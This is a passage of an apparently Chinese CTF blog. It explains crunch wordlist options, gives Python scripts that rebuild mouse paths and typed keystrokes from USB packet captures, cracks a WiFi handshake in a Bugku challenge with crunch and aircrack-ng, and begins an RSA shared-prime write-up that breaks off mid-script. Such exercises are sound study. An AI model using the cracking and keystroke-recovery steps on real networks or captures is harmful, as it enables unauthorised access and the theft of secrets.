<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: crunch [options]</span><br><span class="line"></span><br><span class="line">crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</span><br><span class="line"></span><br><span class="line"> min-len  设定最小字符串长度</span><br><span class="line"> max-len  设定最大字符串长度</span><br><span class="line"> </span><br><span class="line"> options</span><br><span class="line"> -o password.txt 指定输出文件的名称，例如password.txt</span><br><span class="line"></span><br><span class="line">-t 命令</span><br><span class="line"></span><br><span class="line">-t @,%^ 指定模式，</span><br><span class="line"></span><br><span class="line">@ 插入小写字母</span><br><span class="line">, 插入大写字母</span><br><span class="line">% 插入数字</span><br><span class="line">^ 插入特殊符号</span><br></pre></td></tr></table></figure>
<p>Crunch命令详解 以及使用方法</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42025840/article/details/81125584">https://blog.csdn.net/qq_42025840/article/details/81125584</a></p>
<h4 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h4><p>在kali下提取得到 <code>usbdata.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark   -r usb2.pcap  -T fields -e usb.capdata  &gt;  usbdata.txt</span><br></pre></td></tr></table></figure>
<p>然后将16进制的<code>usbdata.txt</code>转化为坐标</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  usb.py  &gt;  xy.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usb.py</span></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> len(line) != <span class="number">12</span> :</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) </span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :                     <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        <span class="keyword">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>
<p>进入gnuplot工具，将xy.txt中的坐标转图片</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gnuplot                   &#x2F;&#x2F;进入gunplot工具</span><br><span class="line">plot  &quot;xy.txt&quot;            &#x2F;&#x2F;把xy.txt文本里的坐标转化为图片</span><br></pre></td></tr></table></figure>
<h4 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>在kali下提取得到<code>usbdata.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>对生成<code>flag.txt</code>去空行后执行下面脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在kali下运行UsbKeyboardDataHacker一步到位</p>
<p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p>
<h4 id="Bugku-想蹭网先解开密码"><a href="#Bugku-想蹭网先解开密码" class="headerlink" title="Bugku[想蹭网先解开密码]"></a>Bugku[想蹭网先解开密码]</h4><p>Wireshark过滤eapol协议的包，发现通过握手包可以对密码实现暴力破解</p>
<p>在kali中使用Crunch工具生成密码字典</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t 1391040%%%% -o password.txt</span><br></pre></td></tr></table></figure>
<p>使用aircrack -ng工具进行破解 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi.cap -w password.txt</span><br></pre></td></tr></table></figure>
<p>-w后面接的是字典</p>
<p>得到flag</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/108179086">https://blog.csdn.net/qq_44108455/article/details/108179086</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42025840/article/details/81125584">https://blog.csdn.net/qq_42025840/article/details/81125584</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/15/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/15/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/" class="post-title-link" itemprop="url">RSAWP(中国剩余定理)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-11-15 12:40:37 / 修改时间：12:42:23" itemprop="dateCreated datePublished" datetime="2020-11-15T12:40:37+08:00">2020-11-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="题目-RSA-e与φ-n-不互素时"><a href="#题目-RSA-e与φ-n-不互素时" class="headerlink" title="题目:RSA-e与φ(n)不互素时"></a>题目:RSA-e与φ(n)不互素时</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure>
<p>0x表示16进制，最后L表示为long型</p>
<h5 id="WP"><a href="#WP" class="headerlink" title="WP:"></a>WP:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723</span></span><br><span class="line">e1=<span class="number">0xfae3a</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63</span></span><br><span class="line">e2=<span class="number">0x1f9eae</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347</span></span><br><span class="line"></span><br><span class="line">p=libnum.gcd(n1,n2)</span><br><span class="line">q1=gmpy2.mpz(n1//p)</span><br><span class="line">q2=gmpy2.mpz(n2//p)<span class="comment">#注意要用//整除不然计算出的结果会有误</span></span><br><span class="line">fn1=(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)</span><br><span class="line">fn2=(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">e1=gmpy2.mpz(e1//<span class="number">14</span>)</span><br><span 